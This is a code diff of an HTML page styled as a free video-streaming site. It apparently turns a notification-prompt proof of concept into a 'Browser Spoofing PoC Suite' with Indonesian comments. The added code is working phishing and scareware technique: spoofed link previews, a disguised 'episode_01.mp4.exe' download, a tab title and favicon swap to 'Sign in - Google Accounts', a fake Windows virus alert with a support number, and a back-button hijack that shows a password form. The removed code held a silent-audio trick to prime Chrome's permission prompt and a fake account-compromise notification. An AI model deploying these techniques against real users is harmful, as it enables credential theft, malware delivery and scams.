@@ -3,171 +3,185 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- MODUL 4: Open Graph spoofing — dipakai platform preview (WhatsApp, Discord, X) -->
+<meta property="og:title" content="Hot Video - Full HD 1080p Free Download">
+<meta property="og:description" content="Watch now — no registration required">
+<meta property="og:image" content="/preview-youtube-style.png">
 <title>Free HD Video Streaming</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' rx='3' fill='%234285F4'/%3E%3Cpath d='M8 3a5 5 0 1 0 4.9 6h-2A3 3 0 1 1 8 5v2.5L11.5 5 8 1.5z' fill='%23fff'/%3E%3C/svg%3E">
+
 <style>
-  body { font-family: Arial, sans-serif; background: #111; color: #eee;
-         text-align: center; padding: 40px 20px; }
-  .player { max-width: 640px; margin: 0 auto; background: #1c1c1c;
-            padding: 20px; border-radius: 10px; }
-  button { padding: 12px 18px; margin: 10px 6px; border: none;
-           border-radius: 4px; background: #e50914; color: #fff;
-           cursor: pointer; font-size: 14px; }
-  button.secondary { background: #444; }
-  pre { text-align: left; background: #222; color: #9fd49f; padding: 10px;
-        font-size: 12px; max-width: 640px; margin: 16px auto;
-        white-space: pre-wrap; }
+  body { font-family: Arial, sans-serif; background:#111; color:#eee;
+         text-align:center; padding:30px 15px; }
+  .m { max-width:640px; margin:14px auto; background:#1c1c1c;
+       padding:16px; border-radius:10px; text-align:left; }
+  button { padding:10px 16px; margin:6px 4px; border:none; border-radius:4px;
+           background:#e50914; color:#fff; cursor:pointer; }
+  button.secondary { background:#444; }
+  pre { background:#222; color:#9fd49f; padding:8px; font-size:12px;
+        white-space:pre-wrap; max-height:200px; overflow:auto; }
+  /* MODUL 3: fake OS dialog overlay */
+  #fakeDialog { display:none; position:fixed; inset:0; background:rgba(0,0,0,.7);
+                z-index:9999; align-items:center; justify-content:center; }
+  .win95 { width:340px; background:#d4d0c8; border:2px solid #7f7f7f;
+           box-shadow:2px 2px 0 #000; font:12px Tahoma, sans-serif; color:#000; }
+  .win95 .t { background:#000080; color:#fff; padding:4px 8px; font-weight:bold;
+              display:flex; justify-content:space-between; }
+  .win95 .b { padding:14px 10px; display:flex; gap:10px; }
+  .win95 .btns { padding:0 10px 12px; text-align:right; }
+  .win95 button { background:#d4d0c8; color:#000; border:1px solid #7f7f7f;
+                  padding:3px 14px; font:11px Tahoma; }
 </style>
 </head>
 <body>
-<div class="player">
-  <h2>HD Player — Now Playing</h2>
-  <!-- Silent 1s WAV embedded as base64 — no external file. Primes the
-       origin as "playing media" so the Chrome notification prompt is
-       treated as in-context (quieter UI / timeout logic mitigation). -->
-  <audio id="silent" preload="auto"
-    src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA="></audio>
+<h2>Browser Spoofing PoC Suite</h2>
 
-  <button id="notifBtn">Enable Notifications</button>
-  <button class="secondary" id="recheckBtn">Re-check Permission</button>
-  <pre id="log"></pre>
+<div class="m">
+  <b>Modul 1 — Download spoofing (media delivery)</b><br>
+  Klik: browser mengunduh file yang di Content-Disposition diberi nama
+  <code>episode_01.mp4.exe</code> / <code>.apk</code>. Di Android,
+  unduhan tampil di notification drawer seperti konten media.
+  <br>
+  <button onclick="dlSpoof()">Download Episode (spoofed)</button>
+</div>
+
+<div class="m">
+  <b>Modul 2 — Tab title + favicon spoofing (session/in-page)</b><br>
+  Tab berubah menjadi tampilan login "Google Security Check" — dipakai
+  saat victim berpindah tab (title spoofing saat blur).
+  <br>
+  <button class="secondary" onclick="spoofTab()">Spoof Tab Title</button>
+  <button class="secondary" onclick="restoreTab()">Restore</button>
+</div>
+
+<div class="m">
+  <b>Modul 3 — Fake OS security alert (in-page overlay)</b><br>
+  Dialog gaya Windows "VIRUS DETECTED — Call support now" (scareware pattern).
+  <br>
+  <button onclick="fakeAlert()">Trigger Fake OS Alert</button>
+</div>
+
+<div class="m">
+  <b>Modul 5 — Back-button phishing (history spoofing)</b><br>
+  Menyuntik history entry palsu: tombol Back browser membawa victim ke
+  halaman phishing di origin yang sama, bukan keluar dari site.
+  <br>
+  <button onclick="backHijack()">Arm Back-button Hijack</button>
+</div>
+
+<pre id="log"></pre>
+
+<!-- MODUL 3: overlay -->
+<div id="fakeDialog">
+  <div class="win95">
+    <div class="t"><span>Windows Security Alert</span><span>✕</span></div>
+    <div class="b">
+      <div style="font-size:32px;">⚠️</div>
+      <div>
+        <b>VIRUS DETECTED on your device!</b><br>
+        3 Trojan files found. Do NOT shut down.<br>
+        Call Microsoft Support immediately:<br>
+        <b style="font-size:14px;">+1-888-555-0199</b>
+      </div>
+    </div>
+    <div class="btns">
+      <button onclick="closeFake()">OK</button>
+      <button onclick="closeFake()">Scan Now</button>
+    </div>
+  </div>
 </div>
 
 <script>
 const logEl = document.getElementById('log');
 const lines = [];
 const ts = () => new Date().toISOString().slice(11, 23);
-function log(msg) {
-  lines.unshift(`[${ts()}] ${msg}`);
-  logEl.textContent = lines.join('\n');
+function log(m) { lines.unshift(`[${ts()}] ${m}`); logEl.textContent = lines.join('\n'); }
+log('PoC loaded. UA: ' + navigator.userAgent);
+
+/* ---------- MODUL 1: download spoofing ----------
+   Endpoint /payload harus merespon dengan header:
+   Content-Disposition: attachment; filename="episode_01.mp4.exe"
+   Content-Type: application/octet-stream
+   Di Chrome/Firefox desktop: dialog save muncul dengan nama .mp4.exe
+   (double-extension). Di Chrome Android: muncul notifikasi
+   "File downloaded" di drawer — pretexts sebagai media. */
+function dlSpoof() {
+  log('Requesting spoofed download: /payload (episode_01.mp4.exe)');
+  const a = document.createElement('a');
+  a.href = '/payload?name=episode_01.mp4.exe';
+  a.download = 'episode_01.mp4.exe';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  log('Download initiated — check downloads bar (desktop) or ' +
+      'notification drawer (Android). Server MUST send matching ' +
+      'Content-Disposition for max fidelity.');
 }
 
-// --- Environment fingerprint (untuk evidence di report) ---
-log('UA: ' + navigator.userAgent);
-log('Initial Notification.permission = ' + (window.Notification ? Notification.permission : 'API unavailable'));
-
-if ('permissions' in navigator) {
-  navigator.permissions.query({ name: 'notifications' }).then(s => {
-    log('Permission API state = ' + s.state);
-    s.onchange = () => log('Permission state changed -> ' + s.state);
-  }).catch(e => log('Permissions query error: ' + e.message));
-}
-
-// --- Silent audio: dua jalur, fallback Web Audio jika data URI diblok ---
-function playSilent() {
-  const au = document.getElementById('silent');
-  const viaAudio = au.play().then(() => 'embedded silent WAV');
-  const viaWebAudio = new Promise((resolve) => {
-    try {
-      const ctx = new (window.AudioContext || window.webkitAudioContext)();
-      const buf = ctx.createBuffer(1, ctx.sampleRate, ctx.sampleRate);
-      const src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start(0);
-      src.onended = () => { ctx.close(); resolve('WebAudio silent buffer'); };
-    } catch (e) { resolve('WebAudio unavailable'); }
-  });
-  return viaAudio.catch(() => viaWebAudio);
-}
-
-// --- Deteksi browser untuk strategi yang tepat ---
-const ua = navigator.userAgent;
-const isFirefox = /firefox/i.test(ua);
-const isChromeAndroid = /android/i.test(ua) && /chrome/i.test(ua) && !/edg/i.test(ua);
-
-// Chrome Android (Juli 2026+): prompt non-blocking BISA time out.
-// Promise bisa resolve saat prompt expired tanpa keputusan user.
-function requestWithTimeoutWatchdog() {
-  const started = Date.now();
-  return Notification.requestPermission().then(p => {
-    const elapsed = ((Date.now() - started) / 1000).toFixed(1);
-    if (p === 'default') {
-      log(`Prompt resolved as "default" after ${elapsed}s — likely ` +
-          'non-blocking prompt timed out (Chrome Android) or user ' +
-          'dismissed quieter UI. Retry via Site Controls (padlock icon).');
-    } else {
-      log(`Prompt resolved as "${p}" after ${elapsed}s`);
+/* ---------- MODUL 2: tab title/favicon spoofing ---------- */
+const legitTitle = document.title;
+const legitIcon = document.querySelector('link[rel="icon"]');
+function spoofTab() {
+  document.title = 'Sign in - Google Accounts';
+  // favicon Google G (data URI) — tab berubah jadi "Google"
+  const l = document.createElement('link');
+  l.rel = 'icon';
+  l.href = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"%3E%3Cpath fill="%234285F4" d="M45 24c0-1.6-.1-3.2-.4-4.7H24v9h11.8C35 32.9 30.1 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3.1l6-6C34.6 6 29.6 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20z"%3E%3C/path%3E%3C/svg%3E';
+  l.id = 'spoofIcon';
+  document.head.appendChild(l);
+  // trigger juga saat user pindah tab (visibilitychange — tab-swap attack)
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      document.title = 'Sign in - Google Accounts';
+      log('visibilitychange fired — title spoofed while tab in background.');
     }
-    return p;
   });
+  log('Tab title + favicon spoofed to "Sign in - Google Accounts". ' +
+      'Visible in tab strip / recent-apps switcher.');
+}
+function restoreTab() {
+  document.title = legitTitle;
+  const s = document.getElementById('spoofIcon');
+  if (s) s.remove();
+  log('Tab restored to legit title.');
 }
 
-function askNotif() {
-  if (!('Notification' in window)) {
-    log('Notifications API unavailable in this browser.');
-    return;
+/* ---------- MODUL 3: fake OS alert ---------- */
+function fakeAlert() {
+  document.getElementById('fakeDialog').style.display = 'flex';
+  // vibration di Android menambah urgensi (ada di Chrome Android)
+  if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+  log('Fake OS security dialog displayed' +
+      (navigator.vibrate ? ' + vibration triggered (Android)' : '') + '.');
+}
+function closeFake() {
+  document.getElementById('fakeDialog').style.display = 'none';
+  log('Fake dialog dismissed by victim.');
+}
+
+/* ---------- MODUL 5: back-button hijack ---------- */
+let armed = false;
+function backHijack() {
+  if (armed) return log('Already armed.');
+  armed = true;
+  // pushState 5 entry palsu — back pertama victim masuk ke phishing state
+  for (let i = 0; i < 5; i++) {
+    history.pushState({ phish: i }, '', '?step=verify-account');
   }
-
-  if (Notification.permission === 'granted') {
-    log('Permission already granted — firing simulated notification.');
-    return firePoC();
-  }
-  if (Notification.permission === 'denied') {
-    log('Permission = denied. Browser will not re-prompt; reset via ' +
-        'site settings (address-bar lock icon) for testing.');
-    return;
-  }
-
-  const proceed = () => {
-    log('Requesting Notification permission from user gesture...');
-
-    let p;
-    if (isChromeAndroid) {
-      p = requestWithTimeoutWatchdog();
-    } else {
-      p = Notification.requestPermission().then(r => {
-        log('Prompt resolved: ' + r);
-        return r;
-      });
-    }
-
-    p.then(result => {
-      if (result === 'granted') {
-        firePoC();
-      } else if (isFirefox && result === 'default') {
-        log('Firefox: prompt not shown (no gesture context) — user saw ' +
-            'URL-bar icon instead. This is expected if gesture chain broke.');
-      } else if (!isChromeAndroid && result === 'default') {
-        log('Chrome desktop: "default" may mean quieter UI mode active — ' +
-            'check the bell icon in the address bar.');
-      }
-    }).catch(e => log('requestPermission error: ' + e.name + ' — ' + e.message));
+  window.onpopstate = (e) => {
+    // back-button membawa victim ke tampilan "verify account" phishing
+    document.title = 'Verify Your Account — Security Required';
+    document.body.innerHTML =
+      '<h2>Session Expired</h2><p>Your account requires immediate ' +
+      'verification. Please re-enter your password:</p>' +
+      '<input type="password" placeholder="Password">' +
+      '<button>Verify Now</button>';
+    log('popstate: back button intercepted — victim landed on ' +
+        'in-origin phishing page instead of leaving the site.');
   };
-
-  if (isFirefox) {
-    // Firefox 72+: gesture context only. Request immediately, no async gap.
-    log('Firefox detected: requesting directly inside gesture handler.');
-    proceed();
-  } else {
-    // Chrome: prime engagement with silent media first.
-    log(isChromeAndroid ? 'Chrome Android detected.' : 'Chrome desktop detected.');
-    playSilent().then(how => {
-      log('Silent audio started (' + how + ') — origin primed as engaged.');
-      proceed();
-    });
-  }
+  log('History poisoned with 5 fake entries. Victim pressing Back ' +
+      'stays trapped in this origin (back-button phishing).');
 }
-
-function firePoC() {
-  try {
-    const n = new Notification('Security Alert: Your Account Was Compromised', {
-      body: 'Click to verify your identity now.',
-      icon: '/icon.png',
-      requireInteraction: true   // stays on screen — better evidence screenshot
-    });
-    n.onclick = () => log('Notification clicked by victim (simulated C2 click-through).');
-    log('Simulated social-engineering notification DISPLAYED. PoC complete.');
-  } catch (e) {
-    // Android Chrome: constructor mungkin dibatasi, gunakan SW registration path
-    log('new Notification() failed (' + e.name + '). On Android use the ' +
-        'Service Worker showNotification path for delivery.');
-  }
-}
-
-document.getElementById('notifBtn').addEventListener('click', askNotif);
-document.getElementById('recheckBtn').addEventListener('click', () => {
-  log('Re-check: Notification.permission = ' + Notification.permission);
-});
 </script>
 </body>
 </html>
